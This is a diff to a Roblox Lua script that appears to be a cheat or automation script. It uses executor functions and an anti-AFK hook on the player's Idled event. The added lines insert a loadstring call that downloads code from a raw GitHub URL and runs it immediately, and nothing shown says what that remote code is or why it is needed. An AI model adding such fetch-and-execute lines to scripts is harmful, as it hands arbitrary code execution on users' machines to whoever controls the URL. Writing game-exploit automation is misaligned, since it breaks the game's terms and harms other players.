@@ -8,6 +8,8 @@ repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstCh
 local plr = game.Players.LocalPlayer
 local Client = require(game.ReplicatedStorage.Library.Client)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OuranosCloud/test/main/low"))()
+
 getgenv().ticka = tick()
 local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
